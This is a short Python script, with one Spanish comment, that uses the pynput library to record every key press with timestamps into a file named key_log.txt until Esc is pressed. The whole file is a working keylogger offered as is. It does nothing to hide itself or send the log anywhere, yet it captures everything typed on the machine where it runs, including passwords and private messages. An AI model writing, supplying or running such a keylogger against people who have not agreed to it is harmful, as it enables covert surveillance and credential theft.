#!/usr/bin/env python3

from pynput.keyboard import Key, Listener
import logging

log_dir = ""  # Directorio donde se guardará el archivo log. Puede ser modificado según prefieras.

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key))
    except AttributeError:
        logging.info('Special Key {0} pressed'.format(key))

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()